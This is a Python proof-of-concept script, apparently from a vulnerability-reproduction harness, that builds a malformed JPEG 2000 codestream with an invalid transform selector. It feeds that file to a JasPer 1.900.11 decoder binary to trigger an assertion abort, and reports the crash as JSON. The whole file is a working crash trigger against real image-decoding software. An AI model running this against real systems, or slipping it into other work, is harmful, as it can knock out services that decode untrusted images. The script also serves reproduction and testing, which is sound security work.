#!/usr/bin/env python3
import argparse
import json
import os
import signal
import struct
import subprocess
import tempfile
import time


OUTPUT_LIMIT = 12000


def marker_segment(marker, body):
    return b"\xff" + bytes([marker]) + struct.pack(">H", len(body) + 2) + body


def build_payload():
    payload = bytearray()

    # SOC
    payload += b"\xff\x4f"

    # SIZ: one 8-bit component, one 1x1 tile covering a 1x1 canvas.
    siz_body = struct.pack(
        ">HIIIIIIIIH",
        0,  # Rsiz
        1,  # Xsiz
        1,  # Ysiz
        0,  # XOsiz
        0,  # YOsiz
        1,  # XTsiz
        1,  # YTsiz
        0,  # XTOsiz
        0,  # YTOsiz
        1,  # Csiz
    )
    siz_body += bytes([7, 1, 1])  # Ssiz, XRsiz, YRsiz
    payload += marker_segment(0x51, siz_body)

    # COD: mostly normal coding defaults, but the transform selector is set
    # to an invalid value. JasPer 1.900.11 reaches tier-1 decode and aborts
    # on an internal qmfbid assertion.
    invalid_transform = 99
    cod_body = struct.pack(">BBHB", 0, 0, 1, 0)
    cod_body += bytes([5, 4, 4, 0, invalid_transform])
    payload += marker_segment(0x52, cod_body)

    # QCD copied structurally from a tiny codestream generated by JasPer.
    payload += marker_segment(
        0x5C,
        bytes.fromhex("40 40 48 48 50 48 48 50 48 48 50 48 48 50 48 48 50"),
    )

    # SOT: one tile-part. The length covers SOT, PLT, SOD payload, and EOC.
    payload += marker_segment(0x90, struct.pack(">HIBB", 0, 42, 0, 1))

    # PLT: minimal packet-length table accepted by the decoder.
    payload += marker_segment(
        0x5D,
        bytes.fromhex("00 40 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"),
    )

    # SOD, a few packet bytes, then EOC.
    payload += b"\xff\x93" + (b"\x80" * 6) + b"\xff\xd9"
    return bytes(payload)


def decode_output(data):
    if data is None:
        return ""
    if isinstance(data, str):
        text = data
    else:
        text = data.decode("utf-8", "replace")
    if len(text) > OUTPUT_LIMIT:
        return text[:OUTPUT_LIMIT] + "\n...[truncated]"
    return text


def signal_name(returncode):
    if returncode is None or returncode >= 0:
        return None
    try:
        return signal.Signals(-returncode).name
    except ValueError:
        return "SIG%d" % (-returncode)


def relevant_stderr(stderr, returncode, timed_out):
    lines = [line.strip() for line in stderr.splitlines() if line.strip()]
    keywords = (
        "ERROR:",
        "AddressSanitizer",
        "UndefinedBehaviorSanitizer",
        "Assertion",
        "assertion",
        "failed",
        "runtime error",
        "Segmentation fault",
    )
    evidence = [line for line in lines if any(key in line for key in keywords)]
    if evidence:
        return "\n".join(evidence[:8])
    if lines:
        return "\n".join(lines[:8])
    if timed_out:
        return "process timed out"
    sig = signal_name(returncode)
    if sig:
        return "process terminated by %s" % sig
    return "no stderr evidence"


def make_result(binary, command, returncode, timed_out, runtime_ms, stdout, stderr, error):
    return {
        "binary": binary,
        "command": command,
        "returncode": returncode,
        "signal": signal_name(returncode),
        "timed_out": timed_out,
        "runtime_ms": runtime_ms,
        "stdout": stdout,
        "stderr": stderr,
        "observable": {
            "kind": "stderr",
            "value": relevant_stderr(stderr, returncode, timed_out),
            "path": None,
        },
        "error": error,
    }


def run(binary, timeout):
    start = time.monotonic()
    command = None
    try:
        with tempfile.TemporaryDirectory(prefix="jasper-jpc-poc-") as tmpdir:
            input_path = os.path.join(tmpdir, "trigger.jpc")
            with open(input_path, "wb") as f:
                f.write(build_payload())

            command = [
                binary,
                "-f",
                input_path,
                "-t",
                "jpc",
                "-F",
                "/dev/null",
                "-T",
                "pnm",
            ]
            try:
                proc = subprocess.run(
                    command,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    timeout=timeout,
                    check=False,
                )
                runtime_ms = int((time.monotonic() - start) * 1000)
                return make_result(
                    binary,
                    command,
                    proc.returncode,
                    False,
                    runtime_ms,
                    decode_output(proc.stdout),
                    decode_output(proc.stderr),
                    None,
                )
            except subprocess.TimeoutExpired as exc:
                runtime_ms = int((time.monotonic() - start) * 1000)
                return make_result(
                    binary,
                    command,
                    None,
                    True,
                    runtime_ms,
                    decode_output(exc.stdout),
                    decode_output(exc.stderr),
                    "process exceeded timeout of %s seconds" % timeout,
                )
    except Exception as exc:
        runtime_ms = int((time.monotonic() - start) * 1000)
        if command is None:
            command = [
                binary,
                "-f",
                "<temporary-trigger.jpc>",
                "-t",
                "jpc",
                "-F",
                "/dev/null",
                "-T",
                "pnm",
            ]
        return make_result(
            binary,
            command,
            None,
            False,
            runtime_ms,
            "",
            "",
            "%s: %s" % (exc.__class__.__name__, exc),
        )


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("--binary", required=True)
    parser.add_argument("--json-out")
    parser.add_argument("--timeout", type=float, default=300.0)
    return parser.parse_args()


def main():
    args = parse_args()
    result = run(args.binary, args.timeout)
    rendered = json.dumps(result, sort_keys=False, indent=2)
    print(rendered)
    if args.json_out:
        with open(args.json_out, "w", encoding="utf-8") as f:
            f.write(rendered)
            f.write("\n")


if __name__ == "__main__":
    main()
